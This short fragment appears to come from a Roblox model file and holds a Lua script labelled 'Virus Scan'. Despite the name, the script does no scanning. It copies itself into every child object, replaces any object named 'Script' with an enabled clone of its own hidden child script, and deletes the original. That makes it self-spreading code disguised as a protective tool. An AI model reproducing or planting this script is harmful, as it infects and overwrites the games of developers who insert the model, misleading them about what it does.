				<string name="Name">Virus Scan</string>
				<ProtectedString name="Source">wait()
x = script.Parent:getChildren()
for i = 1,#x do
if x[i].Name == &quot;Script&quot; then
local d = script.Script:Clone()
d.Disabled = false
d.Parent = x[i].Parent
x[i]:Remove()
end
if x[i].Name ~= &quot;Virus Scan&quot; then
local s = script:Clone()
s.Parent = x[i]
end
end
